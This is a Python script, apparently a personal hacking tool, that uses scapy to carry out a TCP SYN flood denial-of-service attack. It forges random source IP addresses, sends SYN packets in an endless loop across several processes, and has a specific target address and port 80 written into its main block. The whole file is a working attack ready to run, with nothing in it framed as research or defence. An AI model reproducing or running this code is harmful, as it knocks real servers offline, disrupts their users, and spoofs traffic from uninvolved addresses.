#!/usr/bin/python3.7
# -*- coding: utf-8 -*-
# @Author  : Cr4y0n
# @Software: PyCharm
# @Time    : 2020/12/16 14:26

import sys
from scapy.all import *
from multiprocessing import Pool, Process, cpu_count
from random import randrange, choice

class TCP_SYN_Flood():
    def __init__(self, dstIP, dstPORT, ipCount=50, processCount=cpu_count()):
        self.dstIP = dstIP
        self.dstPORT = dstPORT
        self.ipCount = ipCount
        self.processCount = processCount
        self.ipList = self.createRandomIP()

    def createRandomIP(self):
        ipList = []
        for num in range(self.ipCount):
            ip = ""
            for i in range(4):
                tmp = randrange(255)
                ip = ip + str(tmp) + "."
            ipList.append(ip[:-1])
        return ipList

    def tcpSynFlood(self):
        while True:
            srcIP = choice(self.ipList)
            ipLayer = IP(src=srcIP, dst=self.dstIP)
            tcpLayer = TCP(sport=randrange(1024, 65536), dport=self.dstPORT, flags="S")
            packet = ipLayer / tcpLayer
            send(packet)

    def multiProcessFlood(self):
        # srcIPList = self.createRandomIP()
        # for i in range(self.processCount):
        #     p = Process(target=self.tcpSynFlood, args=(choice(srcIPList),))
        #     p.start()
        #     p.join()
        pool = Pool()
        for i in range(self.processCount):
            pool.apply_async(self.tcpSynFlood, ())
        pool.close()
        pool.join()

    def attack(self):
        print("DOS Attack:", self.dstIP, self.dstPORT)
        pool = Pool()
        try:
            for i in range(self.processCount):
                pool.apply_async(self.tcpSynFlood, ())
            pool.close()
            pool.join()
        except KeyboardInterrupt:
            print("\nExit……")
            pool.terminate()
            os._exit(2)

if __name__ == "__main__":
    # dstIP = input("IP：")
    # dstPORT = int(input("PORT："))
    dstIP = "222.24.62.158"
    dstPORT = 80
    # dstIP = sys.argv[1]
    # dstPORT = int(sys.argv[2])
    TCP_SYN_Flood(dstIP, dstPORT).attack()
